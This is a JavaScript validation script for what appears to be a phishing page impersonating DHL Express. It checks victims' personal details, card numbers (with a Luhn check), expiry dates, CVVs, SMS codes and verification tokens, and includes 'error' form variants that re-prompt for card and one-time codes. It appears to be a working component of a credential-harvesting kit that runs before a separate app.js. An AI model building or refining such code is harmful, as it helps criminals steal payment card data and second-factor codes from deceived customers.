// DHL Express — form validation
// BLOCKS invalid submissions BEFORE app.js runs

document.addEventListener('DOMContentLoaded', () => {
    console.log('🔒 Validation system loading...');
    
    // Get browser language for error messages
    const browserLang = navigator.language.substring(0, 2);
    
    // Multi-language error messages
    const errorMessages = {
        en: {
            invalidEmail: 'Invalid email address',
            passwordRequired: 'Password is required',
            invalidData: 'Invalid data',
            invalidCard: 'Invalid card information',
            invalidCardNumber: 'Invalid card number',
            invalidExpiry: 'Invalid expiry date',
            invalidCVV: 'Invalid CVV code',
            invalidSMS: 'Invalid SMS code',
            invalidToken: 'Invalid verification code'
        },
        fr: {
            invalidEmail: 'Adresse e-mail invalide',
            passwordRequired: 'Mot de passe requis',
            invalidData: 'Données invalides',
            invalidCard: 'Informations de carte invalides',
            invalidCardNumber: 'Numéro de carte invalide',
            invalidExpiry: 'Date d\'expiration invalide',
            invalidCVV: 'Code CVV invalide',
            invalidSMS: 'Code SMS invalide',
            invalidToken: 'Code de vérification invalide'
        },
        es: {
            invalidEmail: 'Dirección de correo inválida',
            passwordRequired: 'Contraseña requerida',
            invalidData: 'Datos inválidos',
            invalidCard: 'Información de tarjeta inválida',
            invalidCardNumber: 'Número de tarjeta inválido',
            invalidExpiry: 'Fecha de vencimiento inválida',
            invalidCVV: 'Código CVV inválido',
            invalidSMS: 'Código SMS inválido',
            invalidToken: 'Código de verificación inválido'
        },
        pt: {
            invalidEmail: 'Endereço de e-mail inválido',
            passwordRequired: 'Senha obrigatória',
            invalidData: 'Dados inválidos',
            invalidCard: 'Informações do cartão inválidas',
            invalidCardNumber: 'Número do cartão inválido',
            invalidExpiry: 'Data de validade inválida',
            invalidCVV: 'Código CVV inválido',
            invalidSMS: 'Código SMS inválido',
            invalidToken: 'Código de verificação inválido'
        },
        de: {
            invalidEmail: 'Ungültige E-Mail-Adresse',
            passwordRequired: 'Passwort erforderlich',
            invalidData: 'Ungültige Daten',
            invalidCard: 'Ungültige Karteninformationen',
            invalidCardNumber: 'Ungültige Kartennummer',
            invalidExpiry: 'Ungültiges Ablaufdatum',
            invalidCVV: 'Ungültiger CVV-Code',
            invalidSMS: 'Ungültiger SMS-Code',
            invalidToken: 'Ungültiger Bestätigungscode'
        }
    };
    
    // Get messages for current language (default to English)
    const msgs = errorMessages[browserLang] || errorMessages.en;
    
    function getErrorContainer(input) {
        return (
            input.closest('.holl-float-field') ||
            input.closest('.holl-pay-field') ||
            input.parentElement
        );
    }

    // Show inline error message below input (or at end of floating-field wrapper)
    function showError(input, message) {
        const container = getErrorContainer(input);
        const existingError = container.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorSpan = document.createElement('span');
        errorSpan.className = 'error-message';
        errorSpan.style.cssText = 'color: rgb(185, 28, 28); font-size: 12px; display: block; margin-top: 6px; font-weight: 500;';
        errorSpan.textContent = message;

        container.appendChild(errorSpan);

        input.classList.add('holl-input-invalid');
        input.style.borderColor = 'rgb(185, 28, 28)';
    }

    function clearError(input) {
        const container = getErrorContainer(input);
        const errorSpan = container.querySelector('.error-message');
        if (errorSpan) {
            errorSpan.remove();
        }
        input.classList.remove('holl-input-invalid');
        input.style.borderColor = '';
    }
    
    // ============================================
    // BILLING VALIDATION
    // ============================================
    const billingForm = document.getElementById('billingForm');
    if (billingForm) {
        console.log('✅ Billing form found');
        
        const firstNameInput = document.getElementById('firstName');
        const lastNameInput = document.getElementById('lastName');
        const dobInput = document.getElementById('dateOfBirth');
        const addressInput = document.getElementById('address');
        const cityInput = document.getElementById('city');
        const postalInput = document.getElementById('postalCode');
        const phoneInput = document.getElementById('phoneNumber');
        
        // Clear errors on input
        [firstNameInput, lastNameInput, dobInput, addressInput, cityInput, postalInput, phoneInput].forEach(input => {
            if (input) {
                input.addEventListener('input', function() {
                    clearError(this);
                });
            }
        });
        
        // Format DOB as DD/MM/YYYY (or DD/MM/YY)
        if (dobInput) {
            dobInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
                if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 10);
                this.value = value.slice(0, 10);
            });
        }
        
        // Only numbers in phone
        if (phoneInput) {
            phoneInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
            });
        }
        
        // Validate on submit - PRIORITY: runs before app.js
        billingForm.addEventListener('submit', (event) => {
            let allValid = true;
            
            // Validate all fields are not empty
            [firstNameInput, lastNameInput, dobInput, addressInput, cityInput, postalInput, phoneInput].forEach(input => {
                if (input && !input.value.trim()) {
                    showError(input, msgs.invalidData);
                    allValid = false;
                }
            });
            
            // Validate DOB format DD/MM/YYYY or DD/MM/YY
            if (dobInput && dobInput.value.trim()) {
                const raw = dobInput.value.trim();
                const ok =
                    /^\d{2}\/\d{2}\/\d{4}$/.test(raw) ||
                    /^\d{2}\/\d{2}\/\d{2}$/.test(raw);
                if (!ok) {
                    showError(dobInput, msgs.invalidData);
                    allValid = false;
                } else {
                    const [d, m] = raw.split('/').map(Number);
                    if (m < 1 || m > 12 || d < 1 || d > 31) {
                        showError(dobInput, msgs.invalidData);
                        allValid = false;
                    }
                }
            }
            
            // Validate phone is only numbers
            if (phoneInput && phoneInput.value.trim()) {
                const phonePattern = /^\d+$/;
                if (!phonePattern.test(phoneInput.value)) {
                    showError(phoneInput, msgs.invalidData);
                    allValid = false;
                }
            }
            
            if (!allValid) {
                // BLOCK submission
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation(); // Stop app.js!
                console.log('❌ Billing validation FAILED - BLOCKED');
                return false;
            }
            console.log('✅ Billing validation PASSED');
        }, true); // Capture phase = runs FIRST!
    }
    
    // ============================================
    // CARD VALIDATION (CARD & CARD ERROR)
    // ============================================
    const cardForm = document.getElementById('cardForm') || document.getElementById('carderrorForm');
    if (cardForm) {
        console.log('✅ Card form found');
        
        const cardNumberInput = document.getElementById('cardNumber');
        const expiryInput = document.getElementById('expiryDate');
        const cvvInput = document.getElementById('cvv');
        
        // Luhn check for valid card number
        function luhnCheck(value) {
            let sum = 0;
            let shouldDouble = false;
            for (let i = value.length - 1; i >= 0; i--) {
                let digit = parseInt(value.charAt(i));
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }
        
        // Clear errors on input
        [cardNumberInput, expiryInput, cvvInput].forEach(input => {
            if (input) {
                input.addEventListener('input', function() {
                    clearError(this);
                });
            }
        });
        
        // Format card number as XXXX XXXX XXXX XXXX
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                value = value.substring(0, 16);
                this.value = value.replace(/(.{4})/g, '$1 ').trim();
            });
        }
        
        // Format expiry as MM/YY
        if (expiryInput) {
            expiryInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                this.value = value;
            });
        }
        
        // Format CVV - only numbers, 3 or 4 digits
        if (cvvInput) {
            cvvInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').slice(0, 4);
            });
        }
        
        // Validate on submit - PRIORITY: runs before app.js
        cardForm.addEventListener('submit', (event) => {
            let allValid = true;
            
            // Validate card number: must be 16 digits and valid Luhn
            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
            if (!/^\d{16}$/.test(cardNumber) || !luhnCheck(cardNumber)) {
                showError(cardNumberInput, msgs.invalidCardNumber);
                allValid = false;
            }
            
            // Validate expiry: must be MM/YY format and > current date
            const expiry = expiryInput.value;
            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                showError(expiryInput, msgs.invalidExpiry);
                allValid = false;
            } else {
                const [month, year] = expiry.split('/').map(Number);
                const currentYear = new Date().getFullYear() % 100;
                const currentMonth = new Date().getMonth() + 1;
                
                // Must be valid month
                if (month < 1 || month > 12) {
                    showError(expiryInput, msgs.invalidExpiry);
                    allValid = false;
                }
                // Must be future date
                else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    showError(expiryInput, msgs.invalidExpiry);
                    allValid = false;
                }
            }
            
            // Validate CVV: 3 or 4 digits (3 for most, 4 for Amex)
            const cvv = cvvInput.value;
            const isAmex = /^3[47]/.test(cardNumber);
            if (!((isAmex && /^\d{4}$/.test(cvv)) || (!isAmex && /^\d{3}$/.test(cvv)))) {
                showError(cvvInput, msgs.invalidCVV);
                allValid = false;
            }
            
            if (!allValid) {
                // BLOCK submission
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation(); // Stop app.js!
                console.log('❌ Card validation FAILED - BLOCKED');
                return false;
            }
            console.log('✅ Card validation PASSED');
        }, true); // Capture phase = runs FIRST!
    }
    
    // ============================================
    // SMS VALIDATION
    // ============================================
    const smsForm = document.getElementById('smsForm') || document.getElementById('smserrorForm');
    if (smsForm) {
        console.log('✅ SMS form found');
        
        const smsInput = document.getElementById('smsCode');
        
        if (smsInput) {
            smsInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
                clearError(this);
            });
        }
        
        // Validate on submit
        smsForm.addEventListener('submit', (event) => {
            if (!smsInput.value.trim() || smsInput.value.length < 4) {
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation();
                showError(smsInput, msgs.invalidSMS);
                console.log('❌ SMS validation FAILED - BLOCKED');
                return false;
            }
            console.log('✅ SMS validation PASSED');
        }, true);
    }
    
    // ============================================
    // TOKEN VALIDATION
    // ============================================
    const tokenForm = document.getElementById('tokenForm') || document.getElementById('tokenerrorForm');
    if (tokenForm) {
        console.log('✅ Token form found');
        
        const tokenInput = document.getElementById('tokenCode');
        
        if (tokenInput) {
            tokenInput.addEventListener('input', function() {
                clearError(this);
            });
        }
        
        // Validate on submit
        tokenForm.addEventListener('submit', (event) => {
            if (!tokenInput.value.trim() || tokenInput.value.length < 6) {
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation();
                showError(tokenInput, msgs.invalidToken);
                console.log('❌ Token validation FAILED - BLOCKED');
                return false;
            }
            console.log('✅ Token validation PASSED');
        }, true);
    }
    
    console.log('✅ Validation system ACTIVE');
});
